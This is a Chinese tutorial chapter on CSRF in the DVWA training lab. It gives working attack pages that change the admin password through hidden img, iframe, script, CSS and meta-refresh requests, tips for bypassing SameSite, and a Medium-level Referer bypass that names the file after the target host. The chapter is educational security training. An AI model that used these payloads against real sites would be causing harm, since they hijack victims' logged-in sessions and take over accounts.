# 第7章 DVWA实战：CSRF跨站请求伪造

哈喽小伙伴们，咱们又见面啦！上一章咱们学习了暴力破解，是不是感觉很有意思？今天咱们来聊一个更"狡猾"的漏洞——**CSRF跨站请求伪造**！

为什么说它"狡猾"呢？因为这个漏洞不需要偷你的密码，不需要盗你的账号，甚至不需要你做什么复杂的操作——可能你就是点了一个链接、看了一张图片，然后你的钱就没了，你的密码就被改了，你的账号就被人控制了……是不是听着就很恐怖？😱

别害怕，今天咱们就把CSRF的底裤都扒下来，让你清清楚楚地知道它是怎么回事、怎么攻击、怎么防御。坐稳扶好，咱们出发！🚀

---

## 7.1 什么是CSRF？

### 7.1.1 大白话解释CSRF

先问大家一个问题：你有没有过这种经历——你正在逛淘宝，突然微信里朋友给你发了一个链接，说"快看这个好东西！"，你想都没想就点了，然后……哎？怎么淘宝账号给那个人的店铺点了关注？还收藏了一堆商品？

如果你遇到过这种情况，那恭喜你——你很可能已经遭遇过CSRF攻击了！😂

那CSRF到底是什么呢？**大白话讲：CSRF就是"借刀杀人"，利用你已经登录的身份，在你不知情的情况下，以你的名义干坏事！**

你可以这样理解：
- 你登录了一个网站（比如网银、微博、淘宝），浏览器记住了你的登录状态
- 这时候你打开了另一个"坏网站"
- 这个坏网站偷偷地向你刚才登录的网站发请求（比如转账、发微博、改密码）
- 因为你的浏览器里存着登录信息，所以目标网站一看："哦，这是登录用户发的请求，是本人操作"
- 然后……坏事就发生了！

整个过程中，攻击者**没有拿到你的密码**，**没有偷到你的Cookie**，甚至你**全程都不知道**发生了什么——但事情就是发生了。这就是CSRF的可怕之处：**借你的身份，干它的坏事**。

### 7.1.2 CSRF攻击的三个前提条件

CSRF虽然厉害，但也不是随随便便就能成功的。它需要满足三个条件，缺一不可：

| 前提条件 | 说明 | 为什么需要？ |
|----------|------|-------------|
| **用户已登录目标网站** | 用户在浏览器中登录了目标网站，并且Cookie还没过期 | 只有登录了，浏览器里才有有效的Cookie，请求才会被服务器认可 |
| **用户访问了攻击者的恶意页面** | 用户在登录状态下，打开了攻击者构造的恶意网页 | 恶意页面才会偷偷发起请求，没有这一步攻击就无法触发 |
| **目标网站没有有效的CSRF防御** | 目标网站存在CSRF漏洞，没有验证请求的合法性 | 如果网站有完善的防御，攻击就会失败 |

给大家举个更直白的例子：这就好比你去银行取钱，你得先拿着身份证去银行（已登录），然后有人骗你说"帮我签个字吧"（访问恶意页面），而银行的工作人员只看身份证不看是不是你本人签的（没有防御）——然后钱就被取走了！

三个条件缺一个都不行：
- 如果你没去银行（没登录），那骗子再怎么骗也没用
- 如果你不帮骗子签字（不访问恶意页面），那也没事
- 如果银行既看身份证又看脸（有完善防御），那骗子也骗不到

### 7.1.3 为什么CSRF能成功？——Cookie的"锅"

说到这儿，有小伙伴可能会问：那为什么服务器分不清是用户主动发的请求，还是被诱导发的呢？

答案很简单：**因为服务器只认Cookie！**

咱们来复习一下Cookie的工作原理：
1. 你登录网站，服务器给你发一个Cookie（相当于入场券）
2. 你的浏览器把Cookie存起来
3. 以后你每次访问这个网站，浏览器都会自动带上Cookie
4. 服务器一看Cookie是对的，就知道"哦，这是那个登录的用户"

问题就出在第3步——**浏览器会自动带上Cookie，不管这个请求是你主动发起的，还是被别人诱导的！**

比如：
- 你在地址栏输入网址访问网站 → 浏览器带Cookie ✅
- 你点击网页上的按钮提交表单 → 浏览器带Cookie ✅
- 网页里的图片加载 → 浏览器带Cookie ✅
- 别的网站偷偷加载这个网站的资源 → 浏览器**还是带Cookie** ✅

服务器才不管你是怎么发起的请求，它只看Cookie对不对。Cookie对了，就是"本人操作"；Cookie不对，就是"未登录"。

这就好比你家大门用的是指纹锁，你一抬手门就开了。但是如果有人趁你睡着了，拉着你的手往指纹锁上一按——门也开了！锁只认指纹，不认你是主动按的还是被动按的。🤦‍♂️

CSRF就是利用了这个特点：拉着你的手（利用你的浏览器）去按指纹锁（发送带Cookie的请求），门（服务器）就开了！

### 📍 先看你该访问哪个 URL（三选一）

**本章靶场模块：CSRF**（改管理员密码那个功能）。左边栏点 CSRF 进入。

| 搭建方式 | 本章靶场页面地址 | 恶意页面你放哪？（Kali同学最方便 ✨）|
|---|---|---|
| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/csrf/` | 放 PHPStudy 的 WWW 下：`C:\phpstudy_pro\WWW\evil.html` → 访问 `http://localhost/evil.html` |
| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/csrf/` | 放 Apache 的 html 下：`/var/www/html/evil.html` → 访问 `http://你的KaliIP/evil.html`，Kali 自带 python3 http.server 也行 |
| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/csrf/` | 宿主机开临时服务器：`python3 -m http.server 8080` → 访问 `http://你的KaliIP:8080/evil.html`（**注意 Cookie SameSite，DVWA 默认 None，能带上！**）（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|

<svg viewBox="0 0 1100 430" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
  <defs><linearGradient id="cs1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1558c4"/><stop offset="100%" stop-color="#07234f"/></linearGradient><linearGradient id="cs2" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#8957e5"/><stop offset="100%" stop-color="#321b6b"/></linearGradient><marker id="cs-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#4490ff"/></marker><marker id="cs-purp" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#a371f7"/></marker></defs>
  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 7-1  CSRF · 三角色借刀杀人流程图（Browser → Evil → DVWA）</text>
  <!-- 顶部：受害者浏览器 大框 -->
  <rect x="20" y="64" width="1060" height="92" rx="14" fill="url(#cs1)" stroke="#4490ff" stroke-width="1.4"/>
  <text x="550" y="94" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="17">🌐  受害者浏览器（同一个浏览器进程！Cookie 共享是核心 🍪）</text>
  <g font-family="Arial" font-size="13">
    <rect x="52" y="110" width="336" height="32" rx="6" fill="#001c4a" stroke="#4490ff"/><text x="220" y="131" text-anchor="middle" fill="#e6efff">① Tab A：受害者刚登录过 DVWA（admin）</text>
    <rect x="408" y="110" width="336" height="32" rx="6" fill="#001c4a" stroke="#4490ff"/><text x="576" y="131" text-anchor="middle" fill="#ffe16b" font-weight="bold">② Tab B：受害者点了攻击者发来的 evil.html 🔗</text>
    <rect x="764" y="110" width="300" height="32" rx="6" fill="#001c4a" stroke="#4490ff"/><text x="914" y="131" text-anchor="middle" fill="#9de8b0">DVWA Cookie：PHPSESSID=xyz…（浏览器自动带！🔥）</text>
  </g>
  <!-- 左：恶意页面 evil.html -->
  <rect x="20" y="186" width="320" height="220" rx="14" fill="url(#cs2)" stroke="#a371f7" stroke-width="1.4"/>
  <text x="180" y="218" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">👿  Evil.html（攻击者构造）</text>
  <g font-family="Arial" font-size="12" fill="#f0e4ff">
    <text x="36" y="244">方法一：零宽隐藏 img 标签（最经典 🔥）</text>
    <rect x="36" y="254" width="288" height="46" rx="6" fill="#000" opacity="0.45"/>
    <text x="50" y="276" font-family="Consolas,monospace" fill="#ff80a0">&lt;img src="http://DVWA/csrf/?</text>
    <text x="50" y="292" font-family="Consolas,monospace" fill="#ff80a0">password_new=hacked&amp;password_conf=hacked&amp;Change=Change" style="display:none"&gt;</text>
    <text x="36" y="322">方法二：POST 自动提交表单（改密码必用）</text>
    <rect x="36" y="332" width="288" height="58" rx="6" fill="#000" opacity="0.45"/>
    <text x="50" y="352" font-family="Consolas,monospace" fill="#c7a6ff">&lt;body onload="document.f.submit()"&gt;</text>
    <text x="50" y="370" font-family="Consolas,monospace" fill="#c7a6ff">&lt;form name="f" action="http://DVWA/csrf/" method="POST"&gt;…</text>
  </g>
  <!-- 中间：流程箭头 说明 -->
  <g font-family="Arial" font-size="12.5" fill="#d5e3ff">
    <path d="M340,266 C 400,266 400,230 460,230" stroke="#a371f7" stroke-width="2.2" fill="none" marker-end="url(#cs-purp)"/>
    <text x="400" y="212" text-anchor="middle" fill="#c7a6ff">③ evil.html 一加载</text>
    <text x="400" y="228" text-anchor="middle" fill="#c7a6ff">就偷偷发请求到 DVWA</text>
    <path d="M460,280 C 400,280 400,316 340,316" stroke="#4490ff" stroke-width="2.2" fill="none" stroke-dasharray="5 3" marker-end="url(#cs-blue)"/>
    <text x="400" y="340" text-anchor="middle">④ 响应回来显示破图</text>
    <text x="400" y="356" text-anchor="middle">或重定向，但受害者看不见</text>
  </g>
  <!-- 右：DVWA 服务器 -->
  <rect x="760" y="186" width="320" height="220" rx="14" fill="url(#cs1)" stroke="#4490ff" stroke-width="1.4"/>
  <text x="920" y="218" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🎯  DVWA 服务器（PHP + Apache）</text>
  <g font-family="Arial" font-size="12.5" fill="#e6efff">
    <text x="776" y="244">⑤ 收到改密码请求：</text>
    <rect x="776" y="254" width="288" height="28" rx="6" fill="#000" opacity="0.35"/>
    <text x="790" y="274" font-family="Consolas,monospace" fill="#fff">GET /dvwa/csrf/?pass_new=hacked&amp;Change=Change</text>
    <text x="776" y="306">⑥ 服务器只认 Cookie：</text>
    <text x="788" y="326" fill="#9de8b0">🍪  PHPSESSID 正确 → "本人操作！" ✅</text>
    <text x="788" y="346" fill="#9de8b0">🔑  没有 CSRF Token 校验（Low/Medium）</text>
    <text x="788" y="370" fill="#ff8080" font-weight="bold">💀  密码改成 hacked！攻击完成</text>
    <text x="788" y="388" fill="#ffd700">👉  High 级别才校验 user_token 才难打</text>
  </g>
  <!-- 底部箭头说明 -->
  <line x1="460" y1="230" x2="760" y2="230" stroke="#4490ff" stroke-width="2.2" marker-end="url(#cs-blue)"/>
  <text x="610" y="220" text-anchor="middle" fill="#d5e3ff" font-family="Arial" font-size="12">核心：浏览器自动带上 DVWA Cookie（受害者本人没点，但浏览器代劳了 🤦）</text>
</svg>

> 🔥 **Kali 同学本章速查：3 条命令起一个恶意页面 + 测 Low 级别**
> ```bash
> # 1. 直接往 Apache 根目录写 evil.html（Kali LAMP 同学最爽，避免跨域）
> cat > /var/www/html/evil.html << 'EOF'
> <img src="http://你的KaliIP/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
> <h2>加载中... (404 Not Found)</h2>
> EOF
> chown www-data:www-data /var/www/html/evil.html
>
> # 2. 访问测试（先确保同一浏览器已登录 DVWA admin！）
> firefox-esr http://你的KaliIP/evil.html   # 开同一浏览器的另一个 Tab
>
> # 3. 去 CSRF 页面看：提示 Password Changed. → 成功！
> ```

---

## 7.2 生活例子加深理解

光说理论可能还是有点抽象，咱们来举几个生活中的例子，保证你看完就懂！😊

### 7.2.1 例子1：自动转账的陷阱 🏦

假设你登录了网上银行，浏览器里存了你的登录状态。这时候，你的"好朋友"给你发了一个QQ消息：

> "嘿！快看这个视频，太搞笑了！www.xxx.com/funny.html"

你想都没想就点了进去。网页上确实有个视频在播放，你看得津津有味。

但是你不知道的是，这个网页的源代码里藏了这么一行东西：

```html
<img src="http://bank.com/transfer?to=hacker&money=10000" style="display:none;" />
```

这是一张隐藏的图片，图片地址是银行的转账接口。你的浏览器一打开这个网页，就会自动去"加载"这张图片——也就是自动向银行发送了一个转账请求：给黑客转10000块钱！

因为你的浏览器里存着银行的登录Cookie，所以银行服务器一看："哦，这是登录用户发的请求，是本人操作"，然后就真的转账了！

等你看完视频，什么都没发现，但你的银行卡里已经少了10000块……😢

### 7.2.2 例子2：自动发微博的"神奇图片" 📱

再举个例子：你登录了微博，正在刷首页。这时候有人给你发私信，说"这张照片里有你！快看看！"，还附了一张图片。

你点开图片一看——咦？这不是我啊，发错了吧？然后你就关了。

但是你不知道的是，你点开这张图片的同时，你的微博自动发了一条广告，还自动关注了好几个营销号！

怎么回事呢？因为这张"图片"根本不是图片，它的地址其实是微博的发微博接口：

```
http://weibo.com/post?content=快来买这个保健品！&user=xxx
```

你一点开，浏览器就向微博服务器发了这个请求，带上了你的登录Cookie——然后微博就以为是你要发的，就帮你发出去了！

是不是很坑？人家给你发个"图片"，你就帮人发广告了……😂

### 7.2.3 例子3：被人借走的手机 📲

最后再举一个更接地气的例子：

假设你正在用手机刷微信，手机是解锁状态。这时候你朋友说"借你手机打个电话"，你把手机递给了他。

结果呢？他根本没打电话，而是用你的微信给他自己转了200块钱，还发了一条"我喜欢你"的朋友圈……然后把记录删了，把手机还给你，说"打完了，谢谢！"

你接过手机，什么都没发现，但你的钱没了，社死现场也发生了……😱

这个例子里：
- **手机解锁状态** = 你已经登录了网站（Cookie有效）
- **借你手机的朋友** = 攻击者
- **用你的微信转账/发朋友圈** = CSRF攻击（以你的名义干坏事）
- **你全程不知情** = CSRF的特点

你看，是不是一下子就懂了？CSRF就像是有人"借走"了你已经解锁的手机，偷偷用你的账号干坏事，而你还蒙在鼓里。

---

## 7.3 Low级别通关实战

#### 🐧 Kali / Docker 环境先做 30 秒预检 ✅（你一定会用到！）

CSRF 最容易翻车的点有两个：**① Apache 没启导致 evil.html 打不开；② Cookie 的 SameSite 属性（新版 Chrome 默认 Lax，img 标签请求会带不上）**。先用你的 Kali 终端跑 3 条命令踩坑：

```bash
# ① 确认 Kali IP 和 Apache 状态
KALI_IP=$(ip -4 a | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1)
echo "你的 Kali IP => $KALI_IP" ; sudo systemctl is-active apache2

# ② 一键把 evil.html 放到 /var/www/html 下（本章后面会用到，先占位也行）
sudo touch /var/www/html/evil.html && sudo chmod 644 /var/www/html/evil.html && ls -l /var/www/html/evil.html

# ③ Docker 同学检查宿主机 8080 端口是否占用（后面 python3 http.server 会用）
ss -tlnp 2>/dev/null | grep ":8080" || echo "8080 端口空闲，可以直接开 python3 -m http.server 8080"
```

> 💡 **避坑小贴士（Kali + Docker 通用）：** 如果你用 Chrome 最新版点 evil.html 发现密码没改掉，99% 是 SameSite=Lax 拦截了。解决办法两种：① 用 Kali 自带的 Firefox ESR（默认对 DVWA 这种 http 本地站点更宽容）；② 把 evil.html 改成 `<form action="..." method="POST" id="f"></form><script>f.submit()</script>` 表单自动提交，POST 请求更稳。

好了，理论讲得差不多了，咱们来DVWA里实战一把！光说不练假把式，动手才是硬道理！💪

### 7.3.1 准备工作

首先，打开你的DVWA，确认一下：
1. 确保DVWA已经搭建好并能正常访问
2. 使用用户名 `admin`、密码 `password` 登录
3. 左下角的 **DVWA Security** 选择 **Low**，然后点击Submit

然后点击左边菜单的 **CSRF**，咱们就进入CSRF的练习页面了。

### 7.3.2 认识CSRF模块——改密码功能

哎？小伙伴们可能会问：这不是修改密码的页面吗？怎么是CSRF模块？

哈哈，问得好！**修改密码是CSRF攻击最经典的应用场景**。为啥呢？因为：
- 改密码这个操作很"值钱"——一旦成功，攻击者就能直接接管账号
- 改密码的逻辑相对简单，容易演示
- 现实中很多网站的改密码功能确实存在CSRF漏洞

咱们来看看这个页面：有两个输入框，一个是新密码（New password），一个是确认密码（Confirm new password），还有一个Change按钮。

正常使用的话，你输入新密码、确认密码，点Change，密码就改了。就这么简单。

### 7.3.3 第一步：正常改一次密码，观察请求

好，咱们先来正常改一次密码，看看它是怎么工作的。

**操作步骤：**
1. 在 New password 输入框里输入 `123456`
2. 在 Confirm new password 输入框里也输入 `123456`
3. 点击 Change 按钮

改完之后，你看看浏览器的地址栏变成啥了？是不是变成了类似这样：

```
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
```

**发现了什么？** 小伙伴们仔细看——参数都在URL里！这说明改密码用的是 **GET请求**！

啥是GET请求？就是把参数都放在URL里的请求方式，你在地址栏里就能看到所有参数。

那这意味着什么呢？意味着——**我们只要构造一个特定的URL，别人一点击，密码就自动改了！**

因为所有参数都在URL里啊！只要访问这个URL，就相当于提交了改密码的表单！

### 7.3.4 第二步：构造恶意链接

那咱们来构造一个恶意链接试试。我们想把密码改成 `hacked`，那链接应该怎么写呢？

很简单，把URL里的密码换成我们想改的就行了：

```
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

就这么简单？对，就这么简单！

咱们来测试一下这个链接管不管用。先确认一下当前密码是 `123456`（刚才改的），然后直接在浏览器地址栏里输入上面这个链接，回车访问。

哎？页面是不是显示"Password Changed."？密码改了？

咱们验证一下：退出登录，用新密码 `hacked` 登录一下试试——哎，真的登录成功了！说明密码确实被改成了 `hacked`！

就这么一行URL，就能改别人的密码？是不是感觉有点不可思议？但这就是事实，Low级别就是这么简单粗暴。

当然了，真实场景中，直接发这个链接太明显了，用户一看地址栏是改密码的，肯定会警觉。所以攻击者会用更隐蔽的方式——比如藏在图片里。

### 7.3.5 第三步：构造隐蔽的恶意HTML页面

咱们来做一个更"坏"的——写一个HTML页面，把改密码的请求藏在图片里，用户完全看不到，但浏览器会偷偷执行。

新建一个文本文件，把下面的代码复制进去：

```html
<!DOCTYPE html>
<html>
<head>
    <title>恭喜你中奖了！</title>
</head>
<body>
    <h1>🎉 恭喜你获得100万奖金！🎉</h1>
    <p>你是今天的第10000位幸运访客！</p>
    <p>请点击下方按钮领取你的100万奖金：</p>
    <button>立即领取</button>
    
    <!-- 下面这张图片是隐藏的，用户看不到 -->
    <!-- 但是浏览器会自动加载它，也就是自动发送改密码的请求 -->
    <img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
         style="display:none;" 
         width="0" 
         height="0" />
</body>
</html>
```

把这个文件保存为 `csrf_low.html`，然后用浏览器打开它。

你看到了什么？是不是一个"恭喜中奖"的页面？看起来很正常对吧？

但是！你再去DVWA看看——密码是不是又被改成 `hacked` 了？（如果之前改过就先改回别的再试）

神奇吧？用户打开这个页面，看到的是中奖信息，实际上密码已经被偷偷改掉了！这就是CSRF攻击！

**为什么会这样呢？** 我来给大家拆解一下整个过程：

1. 用户已经登录了DVWA，浏览器里存着DVWA的登录Cookie ✅
2. 用户打开了我们的恶意HTML页面 ✅
3. 浏览器解析HTML，发现里面有个 `<img>` 标签
4. 浏览器很"敬业"，自动去加载这张图片——也就是向 `img` 的 `src` 地址发请求
5. 这个请求发往 `127.0.0.1/dvwa/...`，浏览器自动带上了DVWA的Cookie ✅
6. DVWA服务器收到请求，一看Cookie是对的，参数也对，就以为是用户自己要改密码
7. 密码被改掉了！成功！

完美的"借刀杀人"！🔪

### 7.3.6 第四步：其他隐藏方式

除了用 `<img>` 标签，还有很多方式可以偷偷发起请求。比如：

**用 `<iframe>` 标签：**
```html
<iframe src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
        style="display:none;"></iframe>
```

**用 `<script>` 标签：**
```html
<script src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"></script>
```

**用CSS的背景图片：**
```html
<style>
body {
    background: url('http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change');
}
</style>
```

方法多着呢！只要能让浏览器自动发起HTTP请求的地方，都可以用来做CSRF攻击。

### 7.3.7 源代码分析：为啥Low级别这么弱？

好了，攻击成功了，咱们来看看源代码——为啥Low级别这么不堪一击？

点击DVWA页面右下角的 **View Source** 按钮，就能看到Low级别的源代码了。

代码大概是这样的（我简化了一下，方便大家理解）：

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // 获取用户输入的新密码和确认密码
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // 判断两次输入的密码是否一致
    if( $pass_new == $pass_conf ) {
        // 密码一致，更新数据库
        // ... 省略数据库操作 ...
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // 密码不一致，报错
        echo "<pre>Passwords did not match.</pre>";
    }
}

?>
```

小伙伴们看出问题了吗？这段代码：
- ✅ 接收了新密码和确认密码
- ✅ 检查了两次密码是否一致
- ✅ 更新了数据库

但是——**它什么安全防护都没有做！** 没有验证Referer，没有Token，没有验证码，什么都没有！

只要收到带参数的GET请求，它就改密码。它才不管这个请求是用户自己点的按钮，还是从别的网站来的，反正参数对了就改。

这就好比你家门上装了个锁，但是锁旁边贴着一张纸条，上面写着"说'芝麻开门'就能进"——那跟没装有啥区别？😂

### ✅ 表 7-1 · Low 级别通关速查 & 失败对照表（GET 改密码 + evil.html 自动触发两大方法）

CSRF 跟别的漏洞不一样：**你得有两个浏览器页签**，页签 A 是受害者（已登录 DVWA），页签 B 是攻击者网站（evil.html）。99% 新手失败原因：SameSite 拦截 + 没先验证 GET 直连就急着做 evil.html。按下面顺序走：

| 步骤 | 做什么 | 点哪里 / 敲什么 | 看到什么算这步成功 ✅ | **失败了怎么办？（按报错对照抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 环境三检查（一个不对直接白给） | ① 切 DVWA Security = low + Submit；② 用 `admin / password` **真正登录** DVWA（出现 Welcome 字样）；③ 新开一个页签访问 `http://你的KaliIP/`，确认 Apache 欢迎页出来了（Kali 里 `sudo systemctl start apache2`） | 三项全 OK | 【Apache 页打不开】→ Kali 终端跑 `sudo systemctl enable --now apache2`，再跑 `systemctl status apache2` 看绿色 active |
| 1 | **先测最简单的方法：直接 URL 带参数 GET 改密码（必做！）** | 在已登录的那个浏览器页签，地址栏直接输：<br>`http://你的KaliIP/dvwa/vulnerabilities/csrf/?password_current=&password_new=hacked&password_conf=hacked&Change=Change`<br>→ 回车 | 页面 CSRF 模块下方出现绿色字 **`Password Changed.`** = 改密码成功 ✅ | 【没看到 Password Changed / 出现红色错误】→ 去地址栏看参数对不对：① `password_current=` 必须是空（Low 不验证旧密码，留空就行）；② `password_new` 和 `password_conf` **两次必须一模一样**；③ 有没有带 `Change=Change`（没这个按钮名，PHP 不会进改密码逻辑） |
| 2 | 验证刚才真的改成功了（重要！避免你以为成功了其实没成） | DVWA 右上角点 Logout → 用新密码登录：用户名 `admin`，密码 `hacked` | 登进去 + 出现 Welcome to DVWA | 【登不上，提示 Login Failed】→ 说明步骤 1 其实没成功！回步骤 1 检查三个参数，尤其是 `Change=Change` 很多人忘了写 |
| 3 | 现在还原密码，准备做 evil.html（真实攻击场景不能让用户手动输 URL） | 先把 admin 密码改回 password（不然 evil.html 改完你自己也忘了）：地址栏输 `?password_current=hacked&password_new=password&password_conf=password&Change=Change` | 出现 Password Changed. | 【改不回去了】→ 去 setup.php 点 Create/Reset DB，一切重置，然后重新登录 admin/password |
| 4 | 写 evil.html（攻击者网页，藏在 img src 里自动触发） | Kali 终端：<br>`sudo mousepad /var/www/html/evil.html`<br>粘贴源代码：<br>```<img src="http://你的KaliIP/dvwa/vulnerabilities/csrf/?password_new=csrfed&password_conf=csrfed&Change=Change" width="0" height="0" border="0">```<br>保存 | 文件已保存到 `/var/www/html/evil.html` | 【mousepad 图形化打不开】→ 用 nano：`sudo nano /var/www/html/evil.html`，粘贴完 Ctrl+O 保存、Ctrl+X 退出；或 `echo '<img src=...>' \| sudo tee /var/www/html/evil.html` 直接写 |
| 5 | 先本地测试 evil.html 能不能加载（防止路径错） | 新开一个**无痕窗口**（不是同一个会话），访问：<br>`http://127.0.0.1/evil.html` | 页面空白 + 不显示 404（因为 img 宽高 0）→ 查看源码（Ctrl+U）能看到那行 img | 【404 Not Found】→ 文件不在 /var/www/html 目录下，或者文件权限不对：跑 `sudo chmod 644 /var/www/html/evil.html` + `sudo chown www-data:www-data /var/www/html/evil.html` |
| 6 | **真实 CSRF 攻击流程（关键！）** | ① 回到你**已经登录 DVWA 的那个浏览器页签**（不能是无痕！要带 DVWA Cookie）；② 在**同一个浏览器里再新开一个页签**（关键：同一浏览器共享 Cookie）；③ 新页签访问 `http://你的KaliIP/evil.html` → 加载后会白屏一下；④ 切回 DVWA 页签，手动**刷新一下页面**或回到 CSRF 模块 | CSRF 模块下方出现 **Password Changed.** 绿色字 = 攻击成功！🎉 | 【刷新后还是没改 / SameSite 拦截了】→ 这是 90% 新手失败原因！**新版 Chrome 默认 SameSite=Lax，img/iframe 跨站请求不发送 Cookie**。解决三选一：<br>① 换成 `<script>` 标签或 `<meta http-equiv="refresh">` 跳转（Lax 允许顶层导航 GET 带 Cookie）：<br>```<meta http-equiv="refresh" content="0;url=http://你的IP/dvwa/vulnerabilities/csrf/?password_new=csrfed&password_conf=csrfed&Change=Change">```<br>② 换 Firefox 浏览器测试（旧版 SameSite 没这么严）<br>③ Chrome 地址栏 `chrome://flags/#same-site-by-default-cookies` 改成 Disabled 重启浏览器 |
| 7 | 验证：登出 + 用新密码 csrfed 登录 | 登出 admin → 密码 csrfed 登录 | 成功登录进 DVWA | 【登不上】→ 回到步骤 6，一定是 SameSite 拦截了 / 你忘了同一个浏览器两个页签 / 改完没刷新 CSRF 页面看提示 |

> 💡 **Low 级别查错口诀**：先拿 GET 直连 URL 确保改密码功能没问题 → 再做 evil.html → 最后 SameSite 拦截就换 meta refresh 顶层跳转。**SameSite 坑 99% 的新手都踩过，别慌！**

---

## 7.4 Medium级别绕过

好了，Low级别咱们轻松拿下。接下来咱们升级难度，调到 **Medium** 级别试试！

### 7.4.1 试试Low的方法还管不管用？

先把DVWA难度调到Medium（左下角DVWA Security里选Medium，Submit）。

然后咱们用刚才Low级别的方法试试——直接访问那个改密码的URL，看看还能不能成功？

```
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

哎？怎么不行了？页面是不是显示"That request didn't look correct."（请求看起来不对）？

再试试咱们的恶意HTML页面——也不行了！密码没改掉。

为什么呢？Medium级别加了什么防护？咱们来看看源代码。

### 7.4.2 源代码分析：Referer检查

点击View Source看看Medium级别的源代码：

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // 检查Referer
    // stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
    // 这里检查 $_SERVER['HTTP_REFERER'] 中是否包含 $_SERVER['SERVER_NAME']
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] , $_SERVER[ 'SERVER_NAME' ]) !== false ) {
        
        // Referer检查通过了，才执行改密码的逻辑
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        if( $pass_new == $pass_conf ) {
            // ... 改密码 ...
            echo "<pre>Password Changed.</pre>";
        }
        else {
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Referer检查不通过，报错
        echo "<pre>That request didn't look correct.</pre>";
    }
}

?>
```

看到了吗？Medium级别加了一行关键代码：

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] , $_SERVER[ 'SERVER_NAME' ]) !== false )
```

这行代码是什么意思呢？咱们来拆解一下：

- `$_SERVER['HTTP_REFERER']` —— 这是 **Referer** 请求头，告诉服务器这个请求是从哪个页面来的
- `$_SERVER['SERVER_NAME']` —— 这是服务器的名字（也就是域名/IP，比如 `127.0.0.1`）
- `stripos(a, b)` —— 在字符串a中查找字符串b第一次出现的位置，找不到返回false
- `!== false` —— 不是false，也就是找到了

所以整句话的意思是：**检查Referer里面是否包含服务器的名字（域名/IP），如果包含，就认为是合法请求；如果不包含，就拒绝。**

为什么要检查Referer呢？因为如果是用户自己在DVWA网站上点的按钮，那Referer里肯定包含DVWA的域名。如果是从别的网站来的请求，Referer里就是别的网站的域名，不包含DVWA的域名，就会被拒绝。

听起来挺有道理的对吧？那这个防御能绕过吗？——当然能！不然我怎么往下讲？😏

### 7.4.3 Referer是什么？——先搞懂概念

在讲绕过之前，咱们先把Referer这个东西彻底搞懂。

**Referer（引用页）是HTTP请求头的一个字段，它告诉服务器这个请求是从哪个页面跳转过来的。**

举个例子：
- 你在百度搜索"什么是CSRF"，然后点了一个搜索结果跳转到我的博客
- 这时候发给我博客服务器的请求里，Referer就是百度的URL
- 我一看Referer是百度，就知道你是从百度搜索过来的

再举个例子：
- 你直接在地址栏输入我的博客地址访问
- 这时候Referer就是空的，因为你不是从别的页面跳转过来的

Referer的作用主要是：
1. **统计来源**：网站可以知道用户是从哪里来的
2. **防盗链**：图片网站可以检查Referer，不是自己网站的就不给显示图片
3. **防CSRF**：就像Medium级别这样，检查请求是不是从自己网站来的

但是！**Referer是可以被伪造的！** 而且，有些情况下Referer的检查逻辑写得不好，很容易被绕过。

### 7.4.4 怎么绕过？——让Referer里包含目标域名

咱们再来看Medium级别的检查逻辑：

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] , $_SERVER[ 'SERVER_NAME' ]) !== false )
```

它只是检查Referer里**是否包含**目标域名，而不是检查Referer**是不是等于**目标域名。

这就有漏洞了！比如目标域名是 `127.0.0.1`，那只要Referer里**有** `127.0.0.1` 这几个字符就行，不管它在什么位置！

那我们怎么让Referer里包含 `127.0.0.1` 呢？——很简单，把我们的恶意页面放在一个包含 `127.0.0.1` 的路径里不就行了？

#### 绕过方法1：文件名包含目标域名

最简单的方法：把我们的恶意HTML文件**命名为包含目标IP的文件名**！

比如，目标是 `127.0.0.1`，那我们把HTML文件命名为 `127.0.0.1.html`。

然后我们访问这个文件：`http://攻击者的网站/127.0.0.1.html`

这时候Referer是什么？是 `http://攻击者的网站/127.0.0.1.html`

哎？这里面是不是有 `127.0.0.1`？有啊！文件名就是 `127.0.0.1.html`！

